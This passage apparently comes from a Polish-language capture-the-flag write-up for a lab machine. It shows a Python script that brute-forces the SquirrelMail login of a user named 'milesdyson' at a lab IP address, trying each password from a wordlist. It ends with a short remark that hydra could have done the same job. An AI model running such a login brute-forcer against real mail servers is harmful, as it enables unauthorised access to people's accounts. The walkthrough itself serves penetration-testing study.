    'SQMSESSID': '7k2ji0pj8f72s5vm653l1pktb6',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://10.10.207.21',
    'Connection': 'keep-alive',
    'Referer': 'http://10.10.207.21/squirrelmail/src/login.php',
    # 'Cookie': 'squirrelmail_language=en_US; SQMSESSID=7k2ji0pj8f72s5vm653l1pktb6',
    'Upgrade-Insecure-Requests': '1',
}

username = 'milesdyson'
passwords = [ x.strip() for x in open('log1.txt').read().split('\n') if x ]

for password in passwords:

    data = {
        'login_username': username,
        'secretkey': password,
        'js_autodetect_results': '1',
        'just_logged_in': '1',
    }

    response = requests.post('http://10.10.207.21/squirrelmail/src/redirect.php', cookies=cookies, headers=headers, data=data)
    if "Unknown user or password incorrect." not in response.text:
        print("GOOOOOOL: ")
        print(password)
```
5. Poleceniem `python3 brute_sq.py` uruchamiam utworzony kod.

![](/graphic/skynet_bonus5.bmp)

Finalnie może nie wyszło by szybciej przy dużym słowniku i mogłem użyć narzędzia `hydra`,s ale ta metoda wydała mi się bardzo ciekawa i oryginalna.
